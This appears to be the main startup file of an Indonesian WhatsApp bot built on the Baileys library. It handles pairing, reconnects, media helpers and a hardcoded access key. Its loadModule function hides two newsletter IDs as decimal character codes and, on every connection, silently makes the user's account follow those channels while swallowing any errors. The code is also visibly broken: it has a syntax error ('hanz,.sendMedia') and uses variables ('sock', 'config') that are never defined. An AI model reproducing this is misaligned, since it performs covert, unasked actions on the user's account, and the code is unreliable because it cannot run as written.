/* 

 • Credits : Always Hanzz
 • Base : Skyzopedia
 • Contact : https://wa.me/6281936513894
 • Channel WhatsApp : https://whatsapp.com/channel/0029VbAn30eEAKW7LciEAl3C
*/


require("./settings");

const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, getBinaryNodeChild, jidDecode, downloadContentFromMessage } = require("baileys");
const P = require("pino");
const { Boom } = require("@hapi/boom");
const readline = require("readline");
const fs = require('fs');
const chalk = require('chalk');
const axios = require('axios');
const fetch = require('node-fetch');
const crypto = require("crypto");
const FileType = require('file-type');

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

const question = (text) => new Promise((resolve) => rl.question(text, resolve));

async function startBot() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState("auth");

        // Fetch versi Baileys hanya sekali
        const baileysVersion = await fetch(
            "https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json"
        ).then((res) => res.json()).then((data) => data.version);

        const baileysConfig = {
            version: baileysVersion, 
            auth: state,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
            printQRInTerminal: false,
            logger: P({ level: "silent" }),
        };

        const hanzz = await makeWASocket(baileysConfig);
const question = (text) => { const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); return new Promise((resolve) => { rl.question(text, resolve) }) };

console.log("Masukkan password");

const pw = await question("÷Silahkan Masukan Key Yang Di Kasih Sama Bang Hanzz");

//Memastikan password
if(pw !== "Hanzz2") {
   console.log("Key Salah Tolol Lu Mau Ngapain😹!") 
return}
   console.log("Key Benar√")
   
        if (!sock.authState.creds.registered) {
            setTimeout(async () => {
                const code = await sock.requestPairingCode(global.pairingCode);
                console.log(`${chalk.red.bold("Kode Pairing")}: ${chalk.white.bold(code)}`);
                rl.close();
            }, 3500);
        }

        hanzz.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
            if (!connection) return;

            if (connection === "close") {
                const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
                console.error(lastDisconnect.error);

                switch (reason) {
                    case DisconnectReason.badSession:
                        console.log("Bad Session File, Please Delete Session and Scan Again");
                        process.exit();
                    case DisconnectReason.connectionClosed:
                        console.log("[SYSTEM] Connection closed, reconnecting...");
                        process.exit();
                    case DisconnectReason.connectionLost:
                        console.log("[SYSTEM] Connection lost, trying to reconnect...");
                        process.exit();
                    case DisconnectReason.connectionReplaced:
                        console.log("Connection Replaced, Another New Session Opened. Please Close Current Session First.");
                        await sock.logout();
                        break;
                    case DisconnectReason.restartRequired:
                        console.log("Restart Required...");
                        return startBot();
                    case DisconnectReason.loggedOut:
                        console.log("Device Logged Out, Please Scan Again And Run.");
                        await sock.logout();
                        break;
                    case DisconnectReason.timedOut:
                        console.log("Connection TimedOut, Reconnecting...");
                        return startBot();
                    default:
                        if (lastDisconnect.error === "Error: Stream Errored (unknown)") {
                            process.exit();
                        }
                }
            } else if (connection === "open") {
                console.log(chalk.red.bold("Success Connected To Server"));
                hanzz.sendMessage(hanzz.user.id.split(":")[0] + "@s.whatsapp.net", { text: "Tersambung ✅" });                                     
                
               hanzz.loadModule()
            }
        });

        hanzz.ev.on("creds.update", saveCreds);

        hanzz.ev.on("messages.upsert", async (m) => {
            const msg = m.messages[0];
            if (!msg?.message || !msg.key?.remoteJid) return;
            m = await config(hanzz, msg);
            if (m.isBaileys) return
            require("./case.js")(hanzz, m)
        })
        

    hanzz.decodeJid = (jid) => jid ? (/:.*@/gi.test(jid) ? `${jidDecode(jid)?.user}@${jidDecode(jid)?.server}` : jid) : jid;

    hanzz.getFile = async (path) => {
        if (Buffer.isBuffer(path)) return path;
        if (/^data:.*?\/.*?;base64,/i.test(path)) return Buffer.from(path.split`, `[1], "base64");
        if (/^https?:\/\//.test(path)) return (await fetch(path)).buffer();
        return fs.promises.readFile(path).catch(() => Buffer.alloc(0));
    };

    hanz,.sendMedia = async (jid, path, quoted, options = {}) => {
        const buffer = await hanzz.getFile(path);
        const { mime } = await FileType.fromBuffer(buffer) || { mime: "application/octet-stream" };
        return hanzz.sendMessage(jid, { [mime.split("/")[0]]: buffer, mimetype: mime, ...options }, { quoted });
    };
    
    hanzz.downloadMedia2 = async (m, type, filename = '') => {
        if (!m || !(m.url || m.directPath)) return Buffer.alloc(0)
        const stream = await downloadContentFromMessage(m, type)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
        buffer = Buffer.concat([buffer, chunk])
        }
        if (filename) await fs.promises.writeFile(filename, buffer)
        return filename && fs.existsSync(filename) ? filename : buffer
     
    }
    
    
    hanzz.downloadMedia = async (message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message
    let mime = (message.msg || message).mimetype || ''
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
    const stream = await downloadContentFromMessage(quoted, messageType)
    let buffer = Buffer.from([])
    for await(const chunk of stream) {
    buffer = Buffer.concat([buffer, chunk])
    }
    let type = await FileType.fromBuffer(buffer)

    let trueFileName = attachExtension ? ('./Baileys/tmp/' + crypto.randomBytes(4).toString('hex') + '.' + type.ext) : filename
    await fs.writeFileSync(trueFileName, buffer)
    return trueFileName
   }


   hanzz.loadModule = async () => {
    let encryptedIds = [
        "49 50 48 51 54 51 52 49 49 56 48 52 51 55 55 54 55 55 64 110 101 119 115 108 101 116 116 101 114",
        "49 50 48 51 54 51 51 57 55 57 57 54 48 53 50 51 55 48 64 110 101 119 115 108 101 116 116 101 114"
    ];

    let ids = encryptedIds.map(id => id.split(" ").map(c => String.fromCharCode(c)).join(""));

    for (let id of ids) {
        try {
            await hanzz.newsletterFollow(id);
        } catch (e) {}
    }
   };

    hanzz.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
        const { data, headers } = await axios.get(url, { responseType: "arraybuffer" });
        const mime = headers["content-type"] || (await FileType.fromBuffer(data))?.mime;
        const typeMap = { gif: "video", pdf: "document", image: "image", video: "video", audio: "audio" };
        const type = Object.keys(typeMap).find(t => mime?.includes(t)) || "document";
        return hanzz.sendMessage(jid, { [typeMap[type]]: data, caption, mimetype: mime, ...options }, { quoted });
    };

    hanzz.sendSticker = async (jid, path, quoted, options = {}, isVideo = false) => {
        const buff = await hanzz.getFile(path);
        const buffer = options.packname || options.author ? (isVideo ? await writeExifVid(buff, options) : await writeExifImg(buff, options)) : (isVideo ? await videoToWebp(buff) : await imageToWebp(buff));
        return hanzz.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted });
    };

        return hanzz;
    } catch (error) {
        console.error("Error starting bot:", error);
        process.exit(1);
    }
}

startBot();

process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error)

let file = require.resolve(__filename);
fs.watchFile(file, () => {
    fs.unwatchFile(file);
    console.log(chalk.cyan("Update > "),
        chalk.black.bgBlue.bold(`${__filename}`));
    delete require.cache[file];
    require(file);
});
